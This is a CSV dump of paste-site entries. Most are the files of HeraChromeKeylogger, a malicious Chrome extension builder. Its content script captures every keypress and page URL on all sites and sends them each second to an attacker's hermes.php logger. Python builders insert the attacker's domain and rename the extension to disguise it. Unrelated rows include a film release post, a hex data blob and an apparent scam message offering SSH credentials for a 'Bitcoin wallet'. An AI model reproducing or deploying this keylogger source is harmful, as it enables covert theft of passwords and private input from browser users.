id,title,username,language,date,content
m3GUds7F,Template/manifest.json,FlyFar,JSON,Sunday 19th of November 2023 06:02:42 AM CDT,"{
  ""name"": ""Extension Name"",
  ""description"": ""Extension Description"",
  ""version"": ""1.0"",
  ""permissions"": [
    ""activeTab""
  ],
  ""browser_action"": {
    ""default_title"": ""Extension Default Title""
  },
  ""content_scripts"": [
  {
      ""matches"": [""<all_urls>""],
      ""js"": [""temis.js""]
  }
  ],
  ""manifest_version"": 2,
  ""icons"": { ""16"": ""icon16.png"",
           ""48"": ""icon48.png"",
          ""128"": ""icon128.png"" }
}"
qrFZE2LP,Carne.1991.Fre.DVDRip.h264.aac.Subs-bp,bpmircea,BrainFuck,Sunday 19th of November 2023 06:01:03 AM CDT,"Carne (Carne) (Gaspar Noé, 1991)
aka
Carne.1991.Fre.DVDRip.h264.aac.Subs-bp
https://www.imdb.com/title/tt0218871/

MediaInfo: https://t1p.de/qzcp8

Uploading..."
3uFMiuiB,data757,TestGuy1,JSON,Sunday 19th of November 2023 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f3128a933b3a053ec5e50aedfa3e125786db7f8aece263cf8569a81e30d84e40a27262a7a9aeb99f669f162d20c4cfb451b4e5f7b820052076713ba12e8d42efe465d011fe592f8d979960e840739a88e5c8621275b4b5ad591c4163582a425628ce54468db5e34bc51e73ec7eb638a55806ca8e0dbd53e508c6ccd029059ab9',
  otherdata: [
    '4f95177f325616682c9dd308d0a6de60',
    'ec8f67398834af646ba9f8d06bb28b1d',
    'aff5c130ec2f163b7f709173b7c491d1',
    '323c244512961357652aaf9e527d5fd6',
    '67e0eecb6e4a219d85e55535e81af5fb',
    '1369fb8856e2c86d027de405e0c20b9e',
    '1ffc2cad1aecb48859e447151581a198',
    '855028fdb9b3f5d8c92d4050c46f9f5b'
  ]
}"
QCNg0vVF,BTC Wallet Credentials have been reset,castlclass_20,GetText,Sunday 19th of November 2023 05:59:29 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
sfragilitync:XzE6pK on 212.224.93.130
You can connect via SSH.
Regards"
qXYbRygM,Template/temis.js,FlyFar,JavaScript,Sunday 19th of November 2023 05:58:43 AM CDT,"var keys = '';
var current = document.URL;

new Image().src = url + '/hermes.php?c=[' + current + ']';

document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function(){
        if( keys != """" )
                new Image().src = url + '/hermes.php?c=' + keys + ' ';
        keys = '';
}, 1000);
"
7GZgBPut,core/view.py,FlyFar,Python,Sunday 19th of November 2023 05:56:31 AM CDT,"######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/UndeadSec                #
#                                                    #
######################################################
from os import system
from huepy import *

def clear():
    system('clear')

def phpNot():
    print(red(""\n\n[!] PHP installation not found. Please install PHP and run me again. http://www.php.net/ ""))

def head():
    clear()
    print(cyan('''
UNDEADSEC | t.me/UndeadSec | youtube.com/c/UndeadSec - BRAZIL

██  ██ ████
██  ██ ██   ██   ██████
██████ ████ ████ ██  ██ v1.0
██  ██ ██   ██   ██████
██  ██ ████ ██   ██  ██ Twitter: https://twitter.com/UndeadSec
   CHROME KEYLOGGER
      EXTENSION'''))

def printQue(text):
    print(que(text))

def done():
    print(good('Done. Load your extension in Chrome. (/MaliciousExtension/)'))
    print(good('Your logs will be saved as logs.txt'))


def checkEd():
    print(red("" [!] Do you agree to use this tool for educational purposes only? (y/N) ""), end = '')
    if input('> ').upper() != 'Y':
        clear()
        print(red('\n[ YOU ARE NOT AUTHORIZED TO USE THIS TOOL ]\n'))
        exit(0)

def end():
    clear()
    print(cyan('''
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,        ██  ██ ████
  ,`   ,   { {      } }       ██  ██ ██   ██   ██████               }/
 ;     ,--/`\ \    / /        ██████ ████ ████ ██  ██      }/      /,/
;  ,-./      \ \  { {  (      ██  ██ ██   ██   ██████     /,;    ,/ ,/
; /   `       } } `, `-`-.___ ██  ██ ████ ██   ██  ██    / `,  ,/  `,/
 \|         ,`,`    `~.___,---} CHROME KEYLOGGER        / ,`,,/  ,`,;
  `        { {                      EXTENSION      __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                      ascii by xiong

> Watch us on YouTube: https://youtube.com/c/UndeadSec 
> Follow me on Twitter: https://twitter.com/A1S0N_ 
> Contribute on Github: https://github.com/UndeadSec/HeraKeylogger 
> Join our Telegram Group(Portuguese Brazil): https://t.me/UndeadSec \n'''))"
p2RQFeXh,core/pre.py,FlyFar,Python,Sunday 19th of November 2023 05:55:53 AM CDT,"######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################
from os import system

def checkPHP():
    if 256 != system('which php'):
        return True        
    else:
        return False

def pre():
    system('rm -rf MaliciousExtension')
    system('mkdir MaliciousExtension')
    system('cp Template/* MaliciousExtension/')"
DKm8udVw,core/builder.py,FlyFar,Python,Sunday 19th of November 2023 05:54:48 AM CDT,"######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################
from json import load, dump
from os import system

def build(prefix, domain):
    with open('MaliciousExtension/temis.js', 'r+') as f:
        content = f.read()
        f.seek(0, 0)
        f.write('var url = \'' + prefix + domain + '\';' + '\n' + content)

def editMan(newName, newDesc, newVersion):
    with open('MaliciousExtension/manifest.json', 'r+') as f:
        data = load(f)
        data['name'] = newName
        data['description'] = newDesc
        data['version'] = newVersion
        f.seek(0)
        dump(data, f, indent=4)
        f.truncate()

def runServer():
    system(""sudo php -S 127.0.0.1:80"")"
Ve4xQ71N,hermes.php,FlyFar,PHP,Sunday 19th of November 2023 05:50:12 AM CDT,"<?php
	if(!empty($_GET['c']))
	{
		$logfile = fopen('logs.txt', 'a');
		if($logfile != null)
        		fwrite($logfile, $_GET['c']);
		fclose($logfile);
	}
?>"
MrEwdSfY,hera.py,FlyFar,Python,Sunday 19th of November 2023 05:49:25 AM CDT,"#!/usr/bin/env python3

######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/UndeadSec                #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 hera.py')
    exit(0)

from core.view import *
from core.pre import *
from core.builder import *

if checkPHP() == False:
    phpNot()
    exit(0)

def main():
    printQue('Insert your server ip/domain:')
    domain = input(' > ')
    if 'https://' in domain:
        domain = domain.split('https://')[1]
        prefix = 'https://'
    elif 'http://' in domain:
        domain = domain.split('http://')[1]
        prefix = 'http://'
    else:
        prefix = 'http://'
    build(prefix, domain)
    printQue('Edit manifest informations (i.e: name) [y/n] ?') 
    editManifest = input(' > ')
    if editManifest.upper() == 'Y':
        printQue('Insert a new name:')
        newName = input(' > ')        
        printQue('Insert a new description:')
        newDesc = input(' > ')  
        printQue('Insert a new version number:')      
        newVersion = input(' > ')
        editMan(newName, newDesc, newVersion)
    done()
    printQue('Start local php server [y/n] ?')
    server = input(' > ')
    if server.upper() == 'Y':
        runServer()


if __name__ == ""__main__"":
    try:
        clear()
        checkEd()
        head()
        pre()
        main()                
        
    except KeyboardInterrupt:
        end()
        exit(0)



"
